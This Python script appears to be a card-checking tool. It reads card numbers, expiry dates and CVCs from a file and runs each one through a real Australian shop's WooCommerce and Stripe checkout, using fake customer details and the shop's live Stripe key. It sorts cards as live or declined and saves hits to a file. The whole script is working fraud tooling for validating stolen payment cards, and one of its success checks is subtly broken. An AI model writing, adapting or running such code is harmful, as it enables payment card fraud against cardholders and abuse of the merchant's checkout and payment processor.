import requests,random,string,re
from colorama import Fore, Back, Style, init

init(autoreset=True)
def generate_random_name_and_email():
    first_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8))).capitalize()
    email = f"{first_name.lower()}{random.randint(10, 9999)}"
    return first_name, email

def Tele(ccx):
    session = requests.Session()
    jar = requests.cookies.RequestsCookieJar()
#   jar.set('','')
    name, mail = generate_random_name_and_email()
    ccx = ccx.strip()
    cc = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    #acc
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://yarnclub.com.au',
        'priority': 'u=1, i',
        'referer': 'https://yarnclub.com.au/checkout/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }
    params = {'action': 'mailchimp_set_user_by_email'}
    data = f'email={mail}@gmail.com&mc_language=en&subscribed=1'
    response = session.post('https://yarnclub.com.au/wp-admin/admin-ajax.php',params=params,headers=headers,data=data,)
    jar.update(response.cookies)
    # print("account created" + mail)
    #addstore
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://yarnclub.com.au',
        'priority': 'u=1, i',
        'referer': 'https://yarnclub.com.au/product-category/sale/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    params = {'wc-ajax': 'add_to_cart'}
    data = {
        'success_message': '“1 x Wood Buttons Large 6cm 4 hole Coffee” has been added to your cart',
        'product_sku': 'DB-B671168',
        'product_id': '38290',
        'quantity': '1',
    }
    response = session.post('https://yarnclub.com.au/', params=params,headers=headers, data=data)
    jar.update(response.cookies)
    # print("added prodcut")
    #nonce
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': 'https://yarnclub.com.au/cart/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }
    response = session.get('https://yarnclub.com.au/checkout/',headers=headers)
    print(jar)
    with open("a.txt", "w")as f:
        f.write(response.text)
    match = re.search(r'id="woocommerce-process-checkout-nonce".*?value="(.*?)"', response.text)
    if match:
        nonce = match.group(1)
        # print("nonce:", nonce)
    else:
        print("nonce not found.")
    jar.update(response.cookies)

    #update order
    headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://yarnclub.com.au',
    'priority': 'u=1, i',
    'referer': 'https://yarnclub.com.au/checkout/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
    params = {
        'wc-ajax': 'update_order_review',
    }
    data = {
    'security': '230871be2f',
    'payment_method': 'stripe',
    'country': 'AU',
    'state': 'NSW',
    'postcode': '',
    'city': '',
    'address': '',
    'address_2': '',
    's_country': 'AU',
    's_state': 'NSW',
    's_postcode': '',
    's_city': '',
    's_address': '',
    's_address_2': '',
    'has_full_address': 'false',
    'post_data': f'wc_order_attribution_source_type=organic&wc_order_attribution_referrer=https%3A%2F%2Fwww.google.com%2F&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=google&wc_order_attribution_utm_medium=organic&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fyarnclub.com.au%2F%3Fsrsltid%3DAfmBOopfj9Igpg1iM8pu03MFvfCC4b552KOCdd3j1iu9QmJjF8sVrgtj&wc_order_attribution_session_start_time=2025-01-22%252012%253A59%253A19&wc_order_attribution_session_pages=6&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F132.0.0.0%20Safari%2F537.36&billing_first_name=&billing_last_name=&billing_company=&billing_country=AU&billing_address_1=&billing_address_2=&billing_city=&billing_state=NSW&billing_postcode=&billing_phone=&billing_email=aaaa%2540gmail.com&mailchimp_woocommerce_newsletter=1&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=NSW&shipping_postcode=&order_comments=&shipping_method%5B0%5D=wbs%3A8faa77c9_aus&payment_method=stripe&terms-field=1&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
}
    response = session.post('https://yarnclub.com.au/', params=params, headers=headers, data=data)
    jar.update(response.cookies)

    #stripe
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }
    data = {
        'type': 'card',
        'billing_details[name]': 'aa aa',
        'billing_details[address][line1]': 'aa',
        'billing_details[address][state]': 'NSW',
        'billing_details[address][city]': 'aa',
        'billing_details[address][postal_code]': '3031',
        'billing_details[address][country]': 'AU',
        'billing_details[email]': f'{mail}@gmail.com',
        'billing_details[phone]': '7896541235',
        'card[number]': f'{cc}',
        'card[cvc]': f'{cvc}',
        'card[exp_month]': f'{mm}',
        'card[exp_year]': f'{yy}',
        'guid': 'b08feb0b-4c6e-4397-adfe-47a675ed2bc2291497',
        'muid': '3f03aeae-da72-46c1-b3c3-fc7e052da9441cb02b',
        'sid': 'e50c2f2c-3d59-4d01-b9d8-38f43b5c089f2dd9b0',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/ac314f8efa; stripe-js-v3/ac314f8efa; card-element',
        'referrer': 'https://yarnclub.com.au',
        'time_on_page': '120575',
        'key': 'pk_live_Y9deyfWGBWf6sg614pGC6Ecg00p13dtHGk',
        }
    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    json_data = response.json()
    payment_id = json_data.get("id")
    # print(f"Payment ID: {payment_id}")
    #checkout
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://yarnclub.com.au',
        'priority': 'u=1, i',
        'referer': 'https://yarnclub.com.au/checkout/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    params = {
        'wc-ajax': 'checkout',
    }
    data = {
        'wc_order_attribution_source_type': 'organic',
        'wc_order_attribution_referrer': 'https://www.google.com/',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': 'google',
        'wc_order_attribution_utm_medium': 'organic',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://yarnclub.com.au/?srsltid=AfmBOopfj9Igpg1iM8pu03MFvfCC4b552KOCdd3j1iu9QmJjF8sVrgtj',
        'wc_order_attribution_session_start_time': '2025-01-22 12:59:19',
        'wc_order_attribution_session_pages': '6',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'billing_first_name': 'aa',
        'billing_last_name': 'aa',
        'billing_company': '',
        'billing_country': 'AU',
        'billing_address_1': 'aa',
        'billing_address_2': '',
        'billing_city': 'aa',
        'billing_state': 'NSW',
        'billing_postcode': '3031',
        'billing_phone': '7896541235',
        'billing_email': f'{mail}@gmail.com',
        'mailchimp_woocommerce_newsletter': '1',
        'shipping_first_name': '',
        'shipping_last_name': '',
        'shipping_company': '',
        'shipping_country': 'AU',
        'shipping_address_1': '',
        'shipping_address_2': '',
        'shipping_city': '',
        'shipping_state': 'NSW',
        'shipping_postcode': '',
        'order_comments': '',
        'shipping_method[0]': 'wbs:8faa77c9_aus',
        'payment_method': 'stripe',
        'terms': 'on',
        'terms-field': '1',
        'woocommerce-process-checkout-nonce': f'{nonce}',
        '_wp_http_referer': '/?wc-ajax=update_order_review',
        'stripe_source': f'{payment_id}'
    }
    response = session.post('https://yarnclub.com.au/', params=params,headers=headers, data=data)
    # jar.update(response.cookies)

    if {"result": "success"} in response.text:
        print(Fore.GREEN + f"{ccx} {response.text}")
    elif "incorrect." in response.text:
        print(Fore.GREEN + f"{ccx} The card number is incorrect.")
    elif "declined." in response.text:
        print(Fore.RED + f"{ccx} declined")
    elif "No such PaymentMethod: 'None'" in response.text:
        print(Fore.RED  + f"{ccx} card detail incoorect 'None'")
    else:
        print(Fore.GREEN + f"{ccx}{response.text}")
        with open("q.txt","a+")as f:
            f.write(f"{ccx}{response.text}\n\n")
    print(jar)
from concurrent.futures import ThreadPoolExecutor
try:
    with open("cc.txt", "r") as f:
        lines = f.readlines()
        for line in lines:
            line = line.strip()
            Tele(line)
            # time.sleep(20)
except FileNotFoundError:
    print(Fore.RED + f"The file 'cc.txt' was not found.")
except Exception as e:
    print(Fore.RED + f"An error occurred: {e}")
